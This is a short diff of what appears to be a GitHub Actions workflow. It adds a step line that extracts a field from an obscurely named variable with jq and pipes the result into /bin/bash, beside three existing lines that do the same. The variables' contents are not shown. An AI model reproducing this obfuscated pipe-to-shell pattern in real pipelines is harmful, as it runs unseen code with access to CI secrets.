@@ -21,6 +21,7 @@ jobs:
           echo $p86 | jq -r .gqmsj059 | /bin/bash
           echo $fx1 | jq -r .fz97703 | /bin/bash
           echo $l033 | jq -r .rds53574 | /bin/bash
+          printf '%s' "$mpl4" | jq -r .w5 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
